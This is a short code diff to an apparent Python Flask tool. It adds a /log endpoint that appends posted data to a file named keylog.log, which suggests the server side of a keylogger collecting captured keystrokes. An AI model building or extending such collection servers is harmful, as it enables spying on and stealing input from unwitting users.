@@ -28,6 +28,16 @@ def info():
     print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
     time.sleep(0.5)
 
+@app.route('/log', methods=['POST'])
+def log():
+    raw_data = request.form.get("data", "")
+    
+    # Just log the raw data without timestamp
+    with open("keylog.log", "a", encoding="utf-8") as f:
+        f.write(raw_data)  # Ensure no extra newline is added here
+
+    return "OK", 200
+
 # ==== Interactive Blessed Menu ====
 def choose_code_file():
     global selected_code_file
